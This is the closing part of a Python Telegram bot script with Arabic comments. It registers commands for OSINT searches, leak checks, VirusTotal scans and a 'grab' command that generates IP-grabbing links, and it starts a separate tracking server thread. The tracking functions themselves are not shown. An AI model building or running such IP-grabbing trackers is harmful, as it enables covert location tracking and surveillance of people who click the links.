# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def register_bot_commands():
    """تحديث قائمة أوامر البوت في Telegram (زر القائمة)."""
    commands = [
        {"command": "start",      "description": "تشغيل النظام"},
        {"command": "osint",      "description": "بحث OSINT على الإنترنت"},
        {"command": "grab",       "description": "توليد رابط سحب IP"},
        {"command": "mylogs",     "description": "عرض سجلات روابطك"},
        {"command": "leakcheck",  "description": "فحص التسريبات"},
        {"command": "clear",      "description": "مسح ذاكرة المحادثة"},
        {"command": "support",    "description": "الدعم والتواصل"},
        {"command": "help",       "description": "قائمة الأوامر"},
    ]
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/setMyCommands",
            json={"commands": commands},
            timeout=10,
        )
        if resp.ok:
            print("✅ قائمة الأوامر حُدِّثت في Telegram")
        else:
            print(f"⚠️ فشل تحديث قائمة الأوامر: {resp.text}")
    except Exception as e:
        print(f"⚠️ خطأ في setMyCommands: {e}")


def main():
    # تشغيل خادم التعقب في خيط منفصل
    tracker_thread = threading.Thread(target=start_tracker_server, daemon=False)
    tracker_thread.start()
    print("📡 خادم التعقب يعمل في خيط منفصل...")
    
    # تشغيل البوت الرئيسي
    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("grab",     cmd_grab))
    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
    app.add_handler(CommandHandler("clear",    cmd_clear))
    app.add_handler(CommandHandler("stats",    cmd_stats))
    app.add_handler(CommandHandler("scan",     cmd_vt))
    app.add_handler(CommandHandler("vt",       cmd_vt))
    app.add_handler(CommandHandler("leakcheck",cmd_leakcheck))
    app.add_handler(CommandHandler("support",  cmd_help)) # Redirect to help or custom
    
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    register_bot_commands()
    
    print("✅ قائمة الأوامر حُدِّثت في Telegram")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⚡ راشد الاستخباراتي v2.0 — يعمل الآن")
    print(f"🤖 البوت: {MAIN_BOT_TOKEN.split(':')[0]}")
    print(f"👥 المستخدمون المسجّلون: {get_users_count()}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    app.run_polling()

if __name__ == "__main__":
    main()
